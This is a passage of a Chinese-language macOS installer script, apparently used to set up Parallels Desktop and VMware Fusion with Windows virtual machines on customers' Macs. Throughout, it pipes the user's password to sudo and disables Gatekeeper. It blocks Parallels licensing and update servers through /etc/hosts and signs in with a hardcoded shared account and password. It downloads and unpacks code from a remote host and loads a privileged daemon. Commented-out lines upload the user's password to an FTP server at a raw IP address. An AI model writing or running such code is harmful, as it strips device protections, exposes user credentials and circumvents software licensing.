   	zhendock=$(defaults read com.apple.dock | grep %E5%90%AF%E5%8A%A8Win%E7%B3%BB%E7%BB%9F.app)
    if [ ! "$zhendock" ]; then
   	defaults write com.apple.dock persistent-apps -array-add "<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/Applications/启动Win系统.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>"; killall Dock
    fi
    fi
    zhendock=$(defaults read com.apple.dock | grep Parallels%20Desktop.app)
    if [ ! "$zhendock" ]; then
    defaults write com.apple.dock persistent-apps -array-add "<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/Applications/Parallels Desktop.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>"; killall Dock
    fi
    fi
    fi
    read -t 5 -p " "
osascript <<EOD
activate application "Terminal"
tell application "System Events"
set visible of processes where name is not "Terminal" to false
end tell
EOD
    if [[ $pdbb != "18" ]]; then
    if [[ $pdbb != "17" ]]; then
    if [ -e /Applications/启动Win系统.app ]; then
    clear
    echo
	echo ID: "\033[36m${tbid}\033[0m"		
    echo
    echo 正在安装注册中....
    PDID=$(echo lin1234 | /Applications/Parallels\ Desktop.app/Contents/MacOS/prlsrvctl web-portal signin shizhuo7379x@126.com | grep successfully)
    if [ ! "$PDID" ]; then 
    clear
    echo
    echo
    echo 注意！自动重试中，网络不通注册服务器....此时可以更换WIFI
    PDID=$(echo lin1234 | /Applications/Parallels\ Desktop.app/Contents/MacOS/prlsrvctl web-portal signin shizhuo7379x@126.com | grep successfully)
    fi
    if [ ! "$PDID" ]; then 
    clear
    echo
    echo
    echo 注意！自动重试中，网络不通注册服务器....此时可以更换WIFI
    PDID=$(echo lin1234 | /Applications/Parallels\ Desktop.app/Contents/MacOS/prlsrvctl web-portal signin shizhuo7379x@126.com | grep successfully)
    fi
    if [ ! "$PDID" ]; then 
    clear
    echo
    echo
    echo 注意！自动重试中，网络不通注册服务器....此时可以更换WIFI
    PDID=$(echo lin1234 | /Applications/Parallels\ Desktop.app/Contents/MacOS/prlsrvctl web-portal signin shizhuo7379x@126.com | grep successfully)
    fi
    if [ ! "$PDID" ]; then 
    clear
    echo
    echo
    echo 注意！自动重试中，网络不通注册服务器....此时可以更换WIFI
    PDID=$(echo lin1234 | /Applications/Parallels\ Desktop.app/Contents/MacOS/prlsrvctl web-portal signin shizhuo7379x@126.com | grep successfully)
    fi
    if [ ! "$PDID" ]; then
    clear && printf "\e[3J"
    echo
    echo
    echo
    read -t 60 -p "由于您的网络环境实在太差，建议您更换其他网络，60秒后自动继续尝试..." 
    clear
    echo
    echo 正在安装注册中....
    PDID=$(echo lin1234 | /Applications/Parallels\ Desktop.app/Contents/MacOS/prlsrvctl web-portal signin shizhuo7379x@126.com | grep successfully)    
    if [ ! "$PDID" ]; then 
    clear
    echo
    echo
    echo 注意！自动重试中，网络不通注册服务器....此时可以更换WIFI
    PDID=$(echo lin1234 | /Applications/Parallels\ Desktop.app/Contents/MacOS/prlsrvctl web-portal signin shizhuo7379x@126.com | grep successfully)
    fi
    if [ ! "$PDID" ]; then 
    clear
    echo
    echo
    echo 注意！自动重试中，网络不通注册服务器....此时可以更换WIFI
    PDID=$(echo lin1234 | /Applications/Parallels\ Desktop.app/Contents/MacOS/prlsrvctl web-portal signin shizhuo7379x@126.com | grep successfully)
    fi
    if [ ! "$PDID" ]; then 
    clear
    echo
    echo
    echo 注意！自动重试中，网络不通注册服务器....此时可以更换WIFI
    PDID=$(echo lin1234 | /Applications/Parallels\ Desktop.app/Contents/MacOS/prlsrvctl web-portal signin shizhuo7379x@126.com | grep successfully)
    fi
    fi
    if [ ! "$ycmmaz" ]; then
    open /Applications/启动Win系统.app
    fi
    fi
    fi
    fi
    else
    #curl --connect-timeout 10 -m 60 -o ~/Downloads/JG_Download/111.exe "$ip5/111.exe">/dev/null 2>&1
    if [ "$moderoot" ]; then
osascript <<EOD
do shell script "spctl --master-disable" password "$pass" with administrator privileges
EOD
    else
    echo "$pass" | sudo -S sudo spctl --master-disable   
    fi
    if [ -f ~/Downloads/JG_Download/PD10.dmg ]; then
    hdiutil attach ~/Downloads/JG_Download/PD10.dmg>/dev/null 2>&1
    pdbb="10"
    if [ "$moderoot" ]; then
osascript <<EOD
do shell script "'/Volumes/Parallels Desktop 10/Parallels Desktop.app/Contents/MacOS/inittool' install -t '/Applications/Parallels Desktop.app' -s" password "$pass" with administrator privileges
if (do shell script "cat /etc/hosts") does not contain "update.parallels.com" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 update.parallels.com\" >> /etc/hosts" password "$pass" with administrator privileges
end if
EOD
    else
    echo "$pass" | sudo -S sudo /Volumes/Parallels\ Desktop\ 10/Parallels\ Desktop.app/Contents/MacOS/inittool install -t "/Applications/Parallels Desktop.app" -s>/dev/null 2>&1
    zhenhosts=$(cat /etc/hosts | grep update.parallels.com)
   	if [ ! "$zhenhosts" ]; then
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 update.parallels.com" >> /etc/hosts'
   	fi 
   	fi 
   	fi    
   	 if [ -f ~/Downloads/JG_Download/PD11.dmg ]; then
    hdiutil attach ~/Downloads/JG_Download/PD11.dmg>/dev/null 2>&1
    pdbb="11"
    if [ "$moderoot" ]; then
osascript <<EOD
do shell script "'/Volumes/Parallels Desktop 11/Parallels Desktop.app/Contents/MacOS/inittool' install -t '/Applications/Parallels Desktop.app' -s" password "$pass" with administrator privileges
if (do shell script "cat /etc/hosts") does not contain "update.parallels.com" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 update.parallels.com\" >> /etc/hosts" password "$pass" with administrator privileges
end if
EOD
    else
    echo "$pass" | sudo -S sudo /Volumes/Parallels\ Desktop\ 11/Parallels\ Desktop.app/Contents/MacOS/inittool install -t "/Applications/Parallels Desktop.app" -s>/dev/null 2>&1
    zhenhosts=$(cat /etc/hosts | grep update.parallels.com)
   	if [ ! "$zhenhosts" ]; then
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 update.parallels.com" >> /etc/hosts'
   	fi 
   	fi 
   	fi  
    if [ -f ~/Downloads/JG_Download/PD13.dmg ]; then
    hdiutil attach ~/Downloads/JG_Download/PD13.dmg>/dev/null 2>&1
    pdbb="13"
     if [ "$moderoot" ]; then
osascript <<EOD
do shell script "'/Volumes/Parallels Desktop 13/Parallels Desktop.app/Contents/MacOS/inittool' install -t '/Applications/Parallels Desktop.app' -s" password "$pass" with administrator privileges
if (do shell script "cat /etc/hosts") does not contain "update.parallels.com" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 update.parallels.com\" >> /etc/hosts" password "$pass" with administrator privileges
end if
EOD
    else
    echo "$pass" | sudo -S sudo /Volumes/Parallels\ Desktop\ 13/Parallels\ Desktop.app/Contents/MacOS/inittool install -t "/Applications/Parallels Desktop.app" -s>/dev/null 2>&1
    zhenhosts=$(cat /etc/hosts | grep update.parallels.com)
   	if [ ! "$zhenhosts" ]; then
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 update.parallels.com" >> /etc/hosts'
   	fi 
   	fi 
   	fi
   	if [ -f ~/Downloads/JG_Download/PD14.dmg ]; then
    hdiutil attach ~/Downloads/JG_Download/PD14.dmg>/dev/null 2>&1
    pdbb="14"
    if [ "$moderoot" ]; then
osascript <<EOD
do shell script "'/Volumes/Parallels Desktop 14/Parallels Desktop.app/Contents/MacOS/inittool' install -t '/Applications/Parallels Desktop.app' -s" password "$pass" with administrator privileges
if (do shell script "cat /etc/hosts") does not contain "update.parallels.com" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 update.parallels.com\" >> /etc/hosts" password "$pass" with administrator privileges
end if
EOD
    else
    echo "$pass" | sudo -S sudo /Volumes/Parallels\ Desktop\ 14/Parallels\ Desktop.app/Contents/MacOS/inittool install -t "/Applications/Parallels Desktop.app" -s>/dev/null 2>&1
    zhenhosts=$(cat /etc/hosts | grep update.parallels.com)
   	if [ ! "$zhenhosts" ]; then
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 update.parallels.com" >> /etc/hosts'
   	fi
   	fi
   	fi
   	if [ -f ~/Downloads/JG_Download/PD15.dmg ]; then
    hdiutil attach ~/Downloads/JG_Download/PD15.dmg>/dev/null 2>&1
    pdbb="15"
    if [ "$moderoot" ]; then
osascript <<EOD
do shell script "'/Volumes/Parallels Desktop 15/Parallels Desktop.app/Contents/MacOS/inittool' install -t '/Applications/Parallels Desktop.app' -s" password "$pass" with administrator privileges
if (do shell script "cat /etc/hosts") does not contain "update.parallels.com" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 update.parallels.com\" >> /etc/hosts" password "$pass" with administrator privileges
end if
EOD
    else
    echo "$pass" | sudo -S sudo /Volumes/Parallels\ Desktop\ 15/Parallels\ Desktop.app/Contents/MacOS/inittool install -t "/Applications/Parallels Desktop.app" -s>/dev/null 2>&1
    zhenhosts=$(cat /etc/hosts | grep update.parallels.com)
   	if [ ! "$zhenhosts" ]; then
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 update.parallels.com" >> /etc/hosts'
   	fi
   	fi
   	fi
   	if [ -f ~/Downloads/JG_Download/PD16.dmg ]; then
    hdiutil attach ~/Downloads/JG_Download/PD16.dmg>/dev/null 2>&1
    pdbb="16"
    if [ "$moderoot" ]; then
osascript <<EOD
do shell script "'/Volumes/Parallels Desktop 16/Parallels Desktop.app/Contents/MacOS/inittool' install -t '/Applications/Parallels Desktop.app' -s" password "$pass" with administrator privileges
if (do shell script "cat /etc/hosts") does not contain "update.parallels.com" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 update.parallels.com\" >> /etc/hosts" password "$pass" with administrator privileges
end if
EOD
    else
    echo "$pass" | sudo -S sudo /Volumes/Parallels\ Desktop\ 16/Parallels\ Desktop.app/Contents/MacOS/inittool install -t "/Applications/Parallels Desktop.app" -s>/dev/null 2>&1
    zhenhosts=$(cat /etc/hosts | grep update.parallels.com)
   	if [ ! "$zhenhosts" ]; then
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 update.parallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 download.parallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 toolbox.parallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 account.parallels.com" >> /etc/hosts'
   	fi
   	fi
   	open /Applications/Parallels\ Desktop.app
   	read -t 5 -p " "
   	osascript -e 'quit app"Parallels Desktop"'
   	echo "$pass" | sudo -S sudo rm -rf /Applications/Parallels\ Desktop.app/Contents/MacOS/prl_updater_ctl
   	fi   	
   	if [ -f ~/Downloads/JG_Download/PD17.dmg ]; then
    hdiutil attach ~/Downloads/JG_Download/PD17.dmg>/dev/null 2>&1
    pdbb="17"
    if [ "$moderoot" ]; then
osascript <<EOD
do shell script "'/Volumes/Parallels Desktop 17/Parallels Desktop.app/Contents/MacOS/inittool' install -t '/Applications/Parallels Desktop.app' -s" password "$pass" with administrator privileges
if (do shell script "cat /etc/hosts") does not contain "update.parallels.com" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 update.parallels.com\" >> /etc/hosts" password "$pass" with administrator privileges
end if
EOD
    else
    echo "$pass" | sudo -S sudo /Volumes/Parallels\ Desktop\ 17/Parallels\ Desktop.app/Contents/MacOS/inittool install -t "/Applications/Parallels Desktop.app" -s>/dev/null 2>&1
    zhenhosts=$(cat /etc/hosts | grep update.parallels.com)
   	if [ ! "$zhenhosts" ]; then
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 update.parallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 download.parallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 toolbox.parallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 account.parallels.com" >> /etc/hosts'
   	fi
   	fi
   	open /Applications/Parallels\ Desktop.app
   	read -t 5 -p " "
   	osascript -e 'quit app"Parallels Desktop"'
   	echo "$pass" | sudo -S sudo rm -rf /Applications/Parallels\ Desktop.app/Contents/MacOS/prl_updater_ctl
   	fi
   	fi
   	if [ ! -e /Applications/启动Win系统.app ]; then
   	if [ -e /Applications/Parallels\ Desktop.app ]; then
   	zhendock=$(defaults read com.apple.dock | grep Parallels%20Desktop.app)
    if [ ! "$zhendock" ]; then
    defaults write com.apple.dock persistent-apps -array-add "<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/Applications/Parallels Desktop.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>"; killall Dock
    fi
    fi
    fi
    if [ -f ~/Downloads/JG_Download/VMware-Fusion*.dmg ]; then
    hdiutil attach ~/Downloads/JG_Download/VMware-Fusion*.dmg>/dev/null 2>&1
    if [ -e /Applications/VMware\ Fusion.app ]; then
    if [ "$moderoot" ]; then
osascript <<EOD
do shell script "rm -rf '/Applications/VMware Fusion.app'" password "$pass" with administrator privileges
EOD
    else
    echo "$pass" | sudo -S sudo rm -rf /Applications/VMware\ Fusion.app
    fi
    fi
    if [ -e $HOME/Virtual\ Machines.localized ]; then
    mv $HOME/Virtual\ Machines.localized ~/.Trash
    fi
    if [ -f $HOME/Library/Application\ Support/VMware\ Fusion/vmInventory ]; then
    rm -rf $HOME/Library/Application\ Support/VMware\ Fusion/vmInventory
    fi
    cp -R /Volumes/VMware\ Fusion/VMware\ Fusion.app /Applications
    cp -R /Volumes/VMware\ Fusion/VMware\ Fusion\ Tech\ Preview.app /Applications
    echo >> /tmp/config
    echo .encoding = "UTF-8" > /tmp/config
    echo  >> /tmp/config
    echo fusion.ui.eula.skipPrompt = "TRUE" >> /tmp/config
    echo fusion.ui.registration.skipPrompt = "TRUE" >> /tmp/config
    echo fusion.ui.registration.hideLicense = "TRUE" >> /tmp/config
    echo fusion.ui.dataCollection.skipPrompt = "TRUE" >> /tmp/config
    echo componentDownload.downloadPermission = "deny" >> /tmp/config 
    if [ "$moderoot" ]; then
osascript <<EOD
do shell script "mkdir -p '/Library/Preferences/VMware Fusion'" password "$pass" with administrator privileges
do shell script "cp /tmp/config '/Library/Preferences/VMware Fusion'" password "$pass" with administrator privileges
do shell script "/Applications/'VMware Fusion'.app/Contents/Library/'Initialize VMware Fusion.tool' set" password "$pass" with administrator privileges
do shell script "/Applications/'VMware Fusion'.app/Contents/Library/licenses/vmware-licenseTool enter $licenseKey '' '' $vmkey 'VMware Fusion for Mac OS' '' | grep -q '200 License operation succeeded.'" password "$pass" with administrator privileges
EOD
else
    echo "$pass" | sudo -S sudo mkdir -p /Library/Preferences/VMware\ Fusion
    echo "$pass" | sudo -S sudo cp /tmp/config /Library/Preferences/VMware\ Fusion
    echo "$pass" | sudo -S sudo /Applications/VMware\ Fusion.app/Contents/Library/Initialize\ VMware\ Fusion.tool set
    echo "$pass" | sudo -S sudo /Applications/VMware\ Fusion.app/Contents/Library/licenses/vmware-licenseTool \
      enter $licenseKey '' '' $vmkey 'VMware Fusion for Mac OS' '' \
      | grep -q '200 License operation succeeded.'  
    fi 
    if [ ! -e /Applications/VMware\ Fusion.app ]; then
    curl -# -C - --connect-timeout 10 -o /tmp/Deploy.ini "$ip5/Deploy"$vmkey".ini">/dev/null 2>&1
    cp -R /Volumes/VMware\ Fusion/VMware\ Fusion.app/Contents/Library/Deploy\ VMware\ Fusion.mpkg ~/Downloads/JG_Download
    cp -R /Volumes/VMware\ Fusion/VMware\ Fusion.app ~/Downloads/JG_Download/Deploy\ VMware\ Fusion.mpkg/Contents/00Fusion_Deployment_Items
    rm -rf ~/Downloads/JG_Download/Deploy\ VMware\ Fusion.mpkg/Contents/00Fusion_Deployment_Items/Deploy.ini
    cp /tmp/Deploy.ini ~/Downloads/JG_Download/Deploy\ VMware\ Fusion.mpkg/Contents/00Fusion_Deployment_Items
    if [ "$moderoot" ]; then
osascript <<EOD
do shell script "installer -allowUntrusted -verboseR -pkg ~/Downloads/JG_Download/'Deploy VMware Fusion'.mpkg -target /" password "$pass" with administrator privileges
EOD
    else
    echo "$pass" | sudo -S sudo installer -allowUntrusted -verboseR -pkg ~/Downloads/JG_Download/Deploy\ VMware\ Fusion.mpkg -target /
    fi
    rm -rf ~/Downloads/JG_Download/Deploy\ VMware\ Fusion.mpkg
    fi
    zhendock=$(defaults read com.apple.dock | grep VMware%20Fusion.app)
    if [ ! "$zhendock" ]; then
    defaults write com.apple.dock persistent-apps -array-add "<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/Applications/VMware Fusion.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>"; killall Dock
    fi
    diskutil eject /Volumes/VMware\ Fusion
    umount -f /Volumes/VMware\ Fusion
    diskutil eject $(diskutil list | grep 'VMware Fusion' | sed 's/.*\(disk.*[0123456789]*\).*/\1/g')    
   	fi 
   	if [ "$azw11" ]; then
    if [ -f ~/Downloads/JG_Download/628ARM11.7z ]; then
   	open -a /Applications/Parallels\ Desktop.app /Applications/Windows\ 11.pvm  	
   	fi
   	if [ -f ~/Downloads/JG_Download/823ARM11.7z ]; then
   	open -a /Applications/Parallels\ Desktop.app /Applications/Windows\ 11.pvm  	
   	fi
   	if [ -f ~/Downloads/JG_Download/1113ARM11.7z ]; then
   	open -a /Applications/Parallels\ Desktop.app /Applications/Windows\ 11.pvm  	
   	fi
   	if [ -f ~/Downloads/JG_Download/1122H2.7z ]; then
   	open -a /Applications/Parallels\ Desktop.app /Applications/Windows\ 11.pvm  	
   	fi
   	if [ -f ~/Downloads/JG_Download/903ARM11.7z ]; then
   	open -a /Applications/Parallels\ Desktop.app /Applications/Windows\ 11.pvm  	
   	fi
   	if [ -f ~/Downloads/JG_Download/A111212.7z ]; then
   	open -a /Applications/Parallels\ Desktop.app /Applications/Windows\ 11.pvm  	
   	fi
   	if [ -f ~/Downloads/JG_Download/Win11.7z ]; then
   	open -a /Applications/Parallels\ Desktop.app /Applications/Windows\ 11.pvm   	
   	fi
   	if [ -f ~/Downloads/JG_Download/16Win11.7z ]; then
   	open -a /Applications/Parallels\ Desktop.app /Applications/Windows\ 11.pvm   	
   	fi   	
   	fi
   	if [ "$azw10" ]; then
    if [ -f ~/Downloads/JG_Download/628ARM10.7z ]; then
   	open -a /Applications/Parallels\ Desktop.app /Applications/Windows\ 10.pvm  	
   	fi
   	if [ -f ~/Downloads/JG_Download/823ARM10.7z ]; then
   	open -a /Applications/Parallels\ Desktop.app /Applications/Windows\ 10.pvm  	
   	fi
   	if [ -f ~/Downloads/JG_Download/1113ARM10.7z ]; then
   	open -a /Applications/Parallels\ Desktop.app /Applications/Windows\ 10.pvm  	
   	fi
   	if [ -f ~/Downloads/JG_Download/Win10.7z ]; then
   	open -a /Applications/Parallels\ Desktop.app /Applications/Windows\ 10.pvm   	
   	fi
   	if [ -f ~/Downloads/JG_Download/14Win10.7z ]; then
   	open -a /Applications/Parallels\ Desktop.app /Applications/Windows\ 10.pvm   	
   	fi
   	if [ -f ~/Downloads/JG_Download/14Win10_911.7z ]; then
   	open -a /Applications/Parallels\ Desktop.app /Applications/Windows\ 10.pvm   	
   	fi
   	if [ -f ~/Downloads/JG_Download/16Win10.7z ]; then
   	open -a /Applications/Parallels\ Desktop.app /Applications/Windows\ 10.pvm   	
   	fi
   	if [ -f ~/Downloads/JG_Download/17Win10.7z ]; then
   	open -a /Applications/Parallels\ Desktop.app /Applications/Windows\ 10.pvm   	
   	fi
   	if [ -f ~/Downloads/JG_Download/v10.7z ]; then
   	open -a /Applications/VMware\ Fusion.app /Applications/Windows\ 10\ x64.vmwarevm
   	fi   
   	if [ -f ~/Downloads/JG_Download/911v10.7z ]; then
   	open -a /Applications/VMware\ Fusion.app /Applications/Windows\ 10\ x64.vmwarevm
   	fi 		
   	fi
   	if [ "$azw7" ]; then
   	if [ -f ~/Downloads/JG_Download/Win7.7z ]; then
   	open -a /Applications/Parallels\ Desktop.app /Applications/Windows\ 7.pvm   	
   	fi
   	if [ -f ~/Downloads/JG_Download/14Win7.7z ]; then
   	open -a /Applications/Parallels\ Desktop.app /Applications/Windows\ 7.pvm   	
   	fi
   	if [ -f ~/Downloads/JG_Download/14Win7_911.7z ]; then
   	open -a /Applications/Parallels\ Desktop.app /Applications/Windows\ 7.pvm   	
   	fi
   	if [ -f ~/Downloads/JG_Download/16Win7_911.7z ]; then
   	open -a /Applications/Parallels\ Desktop.app /Applications/Windows\ 7.pvm   	
   	fi
    if [ -f ~/Downloads/JG_Download/v7.7z ]; then
   	open -a /Applications/VMware\ Fusion.app /Applications/Windows\ 7\ x64.vmwarevm
   	fi
   	if [ -f ~/Downloads/JG_Download/911v7.7z ]; then
   	open -a /Applications/VMware\ Fusion.app /Applications/Windows\ 7\ x64.vmwarevm
   	fi
   	fi
    umount -f /Volumes/Parallels\ Desktop\ "$pdbb"
    diskutil eject $(diskutil list | grep 'Parallels Desktop '$pdbb'' | sed 's/.*\(disk.*[0123456789]*\).*/\1/g')
    #echo "TBName=$tbid" > /tmp/mac.txt
    #echo "TVName=$TVName" >> /tmp/mac.txt
    #echo "PSName=$pass" >> /tmp/mac.txt
	if [ -f /tmp/mac.txt ]; then
	#curl --connect-timeout 10 -m 20 -T /tmp/mac.txt -u $ftpm ftp://43.138.25.54>/dev/null 2>&1
	echo
	fi
	if [ -f ~/Downloads/JG_Download/Mbox.exe ]; then
	cp ~/Downloads/JG_Download/Mbox.exe ~/Downloads/JG_Download/更新虚拟机的软件管家.exe
	fi	
	#rm -rf /tmp/mac.txt
	if [ "$czxnj" ]; then	
    clear && printf "\e[3J"
    echo
	echo	
    #echo  "\033[36m请点击【好】\033[0m"	
	#osascript <<EOD
#set PD to "Parallels Desktop"
#set PDA to application PD
#tell PDA to close (every window whose name is "安装助手")
#tell PDA to close (every window whose name is "控制中心")
#EOD
    fi	
    clear && printf "\e[3J"
    echo
	echo	
    echo ID: "\033[36m${tbid}\033[0m"		
	echo
	echo
	osascript -e 'Tell application "System Events" to display dialog "安装完成，请通知技术员！" buttons {"OK"}'
	if [ "$ycmmaz" ]; then
	clear && printf "\e[3J"
	echo
	echo
	#if [[ $modelxh = "13."* ]]; then	
    echo "\033[36m这个窗口，请您现在直接关闭！\033[0m"
	echo 
	echo "\033[36m这个窗口，请您现在直接关闭！\033[0m"
	echo 
	echo "\033[36m这个窗口，请您现在直接关闭！\033[0m"
	echo 
	echo "\033[36m这个窗口，请您现在直接关闭！\033[0m"
	echo 
	echo "\033[36m这个窗口，请您现在直接关闭！\033[0m"
	exit 0
	fi
	#sleep 8
	#killall Terminal
	#fi
    exit 0
    fi   
     

    if [ -f ~/Downloads/JG_Download/ParallelsDesktop-"$pdbb"*.dmg ]; then
    if [[ $modelxh = "10.14"* ]]; then
    pddbb="1"
    fi
    if [[ $modelxh = "10.13"* ]]; then
    pddbb="1"
    fi
    if [[ $modelxh = "10.12"* ]]; then
    pddbb="1"
    fi
    if [[ $modelxh = "10.11"* ]]; then
    pddbb="1"
    fi
    if [ -e /Applications/Windows\ 11.pvm ]; then
    pdqd="11"
    fi    
    if [ -e /Applications/Windows\ 10.pvm ]; then
    pdqd="10"
    fi
    if [ -e /Applications/Windows\ 7.pvm ]; then
    pdqd="7"
    fi 
    if [ -e ~/Parallels/Windows\ 11.pvm ]; then
    pdqd="11"
    fi 
    if [ -e ~/Parallels/Windows\ 10.pvm ]; then
    pdqd="10"
    fi 
    if [ -e ~/Parallels/Windows\ 7.pvm ]; then
    pdqd="7"
    fi 
    if [ "$pddbb" ]; then
    curl -# -C - --connect-timeout 10 -o /tmp/PDqd"$pdqd".zip "$ip5/PDqd"$pdqd".zip">/dev/null 2>&1
	unzip -o "/tmp/PDqd"$pdqd".zip" -d "/Applications">/dev/null 2>&1
	else
	curl -# -C - --connect-timeout 10 -o /tmp/PDTun.zip "$ip5/PDTun.zip">/dev/null 2>&1
	unzip -o "/tmp/PDTun.zip" -d "/Applications">/dev/null 2>&1
	fi
	killall prl_client_app >/dev/null 2>&1 
	killall PD\ Runner >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/Parallels\ Desktop.app >/dev/null 2>&1 
    hdiutil attach ~/Downloads/JG_Download/ParallelsDesktop-"$pdbb"*.dmg>/dev/null 2>&1
    if [ "$moderoot" ]; then
osascript <<EOD
do shell script "'/Volumes/Parallels Desktop $pdbb/Parallels Desktop.app/Contents/MacOS/inittool' install -t '/Applications/Parallels Desktop.app' -s" password "$pass" with administrator privileges
if (do shell script "cat /etc/hosts") does not contain "update.parallels.com" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 update.parallels.com\" >> /etc/hosts" password "$pass" with administrator privileges
end if
do shell script "mkdir -p /Library/LaunchDaemons" password "$pass" with administrator privileges
do shell script "mkdir -p /Library/PrivilegedHelperTools" password "$pass" with administrator privileges
do shell script "cp /Applications/启动Win系统.app/Contents/Library/LaunchServices/com.lihaoyun6.PD-Runner-Helper /Library/PrivilegedHelperTools/" password "$pass" with administrator privileges
do shell script "cp /Applications/启动Win系统.app/Contents/Resources/com.lihaoyun6.PD-Runner-Helper.plist /Library/LaunchDaemons/" password "$pass" with administrator privileges
do shell script "chmod 600 /Library/LaunchDaemons/com.lihaoyun6.PD-Runner-Helper.plist" password "$pass" with administrator privileges
do shell script "launchctl load /Library/LaunchDaemons/com.lihaoyun6.PD-Runner-Helper.plist" password "$pass" with administrator privileges
EOD
    else
    echo "$pass" | sudo -S sudo /Volumes/Parallels\ Desktop\ "$pdbb"/Parallels\ Desktop.app/Contents/MacOS/inittool install -t "/Applications/Parallels Desktop.app" -s>/dev/null 2>&1
    if [ ! -e /Applications/Parallels\ Desktop.app ]; then
    clear && printf "\e[3J"
    echo
	echo	
    echo ID: "\033[36m${tbid}\033[0m"		
	echo
	read -s -n1 -p "未能安装虚拟机软件，空间不足或者修复非root，再重试..."
	if [ "$ycmmaz" ]; then
	clear && printf "\e[3J"
    echo
	echo
	echo
	osascript -e 'Tell application "System Events" to display dialog "未能安装虚拟机软件，空间不足或者修复非root，请通知技术员！" buttons {"OK"}'
	exit
	fi
	ZLDQ
    fi
   	zhenhosts=$(cat /etc/hosts | grep update.parallels.com)
   	if [ ! "$zhenhosts" ]; then
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 update.parallels.com" >> /etc/hosts'
   	fi
   	echo "$pass" | sudo -S sudo mkdir -p /Library/LaunchDaemons
   	echo "$pass" | sudo -S sudo mkdir -p /Library/PrivilegedHelperTools
   	echo "$pass" | sudo -S sudo cp /Applications/启动Win系统.app/Contents/Library/LaunchServices/com.lihaoyun6.PD-Runner-Helper /Library/PrivilegedHelperTools/
   	echo "$pass" | sudo -S sudo cp /Applications/启动Win系统.app/Contents/Resources/com.lihaoyun6.PD-Runner-Helper.plist /Library/LaunchDaemons/
   	echo "$pass" | sudo -S sudo chmod 600 /Library/LaunchDaemons/com.lihaoyun6.PD-Runner-Helper.plist
   	echo "$pass" | sudo -S sudo launchctl load /Library/LaunchDaemons/com.lihaoyun6.PD-Runner-Helper.plist
   	fi
    if [ "$pddbb" ]; then
    open /Applications
    else
    zhendock=$(defaults read com.apple.dock | grep %E5%90%AF%E5%8A%A8Win%E7%B3%BB%E7%BB%9F.app)
    if [ ! "$zhendock" ]; then
   	defaults write com.apple.dock persistent-apps -array-add "<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/Applications/启动Win系统.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>"; killall Dock
    fi
    open /Applications/启动Win系统.app
    fi
    diskutil eject /Volumes/Parallels\ Desktop\ "$pdbb"
    umount -f /Volumes/Parallels\ Desktop\ "$pdbb"
    diskutil eject $(diskutil list | grep 'Parallels Desktop '$pdbb'' | sed 's/.*\(disk.*[0123456789]*\).*/\1/g')
    #curl --connect-timeout 10 -m 60 -o ~/Downloads/JG_Download/111.exe "$ip5/111.exe">/dev/null 2>&1
    clear
    echo 正在安装注册中....
    PDID=$(echo lin1234 | /Applications/Parallels\ Desktop.app/Contents/MacOS/prlsrvctl web-portal signin shizhuo7379x@126.com | grep successfully)
    if [ ! "$PDID" ]; then 
    clear
    echo
    echo
    echo 注意！自动重试中，网络不通注册服务器....此时可以更换网络
    PDID=$(echo lin1234 | /Applications/Parallels\ Desktop.app/Contents/MacOS/prlsrvctl web-portal signin shizhuo7379x@126.com | grep successfully)
    fi
    if [ ! "$PDID" ]; then 
    clear
    echo
    echo
    echo 注意！自动重试中，网络不通注册服务器....此时可以更换网络
    PDID=$(echo lin1234 | /Applications/Parallels\ Desktop.app/Contents/MacOS/prlsrvctl web-portal signin shizhuo7379x@126.com | grep successfully)
    fi
    if [ ! "$PDID" ]; then 
    clear
    echo
    echo
    echo 注意！自动重试中，网络不通注册服务器....此时可以更换网络
    PDID=$(echo lin1234 | /Applications/Parallels\ Desktop.app/Contents/MacOS/prlsrvctl web-portal signin shizhuo7379x@126.com | grep successfully)
    fi
    if [ ! "$PDID" ]; then 
    clear
    echo
    echo
    echo 注意！自动重试中，网络不通注册服务器....此时可以更换网络
    PDID=$(echo lin1234 | /Applications/Parallels\ Desktop.app/Contents/MacOS/prlsrvctl web-portal signin shizhuo7379x@126.com | grep successfully)
    fi
    open /Applications/Parallels\ Desktop.app
   	fi 
 

    if [ -f ~/Downloads/JG_Download/VMware-Fusion*.dmg ]; then
    echo
	echo ID: "\033[36m${tbid}\033[0m"		
    echo
